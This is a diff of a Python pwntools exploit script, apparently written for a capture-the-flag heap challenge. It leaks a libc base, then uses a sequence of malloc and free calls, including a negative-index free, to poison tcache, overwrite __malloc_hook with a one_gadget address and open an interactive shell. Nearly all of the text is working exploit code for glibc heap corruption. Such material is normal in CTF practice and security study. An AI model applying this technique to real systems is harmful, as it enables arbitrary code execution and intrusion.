@@ -39,22 +39,17 @@ def main():
     log.info("libc base: {}".format(hex(libc.address)))
     log.info("__malloc_hook address: {}".format(hex(libc.symbols['__malloc_hook']))) 
 
-    # tcache attack
-    return_2hook = libc.symbols['__malloc_hook'] - 0x23 + 0x10
     one_gadget = libc.address + 0x10a38c
-
-    #malloc(0x20)
-    #free(0)
-    free(return_2hook)
-    
+    malloc(928) # 1
+    free(0) # 2
+    free(-528) # 3
+    malloc(0xf0) # 4
+    write(p64(libc.symbols['__malloc_hook'])) # 5
+    gdb.attach(r)
+    malloc(0) # 6
+    write(p64(one_gadget)) # 7
     r.interactive()
 
 
 if __name__ == "__main__":
     main()
-'''
-2 pointers to last allocated chunk on the stack - modify caps?
-free arbitrary
-
-malloc(0x38) in bye
-'''
